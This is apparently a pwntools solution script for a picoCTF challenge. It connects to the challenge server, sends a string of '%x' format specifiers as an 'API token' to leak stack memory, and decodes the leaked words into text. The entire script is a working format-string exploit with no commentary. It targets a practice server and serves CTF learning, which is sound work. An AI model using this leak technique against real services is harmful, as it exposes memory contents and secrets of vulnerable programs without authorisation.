from pwn import *
r = remote('mercury.picoctf.net', 16439)
r.recvuntil("portfolio")
r.send("1\n")
r.recvuntil("API token?")
r.send("%x"+("-%x"*100))
r.recvline()
r.recvline()
received = r.recvline()
print(received)
x = received[:-1]
print(x)
x = received[:-1].decode()
print(x)
res = ''
for i in x.split('-'):
    if len(i) == 8:
        y = bytearray.fromhex(i)

        for k in reversed(y):
            res += chr(k)

print(res)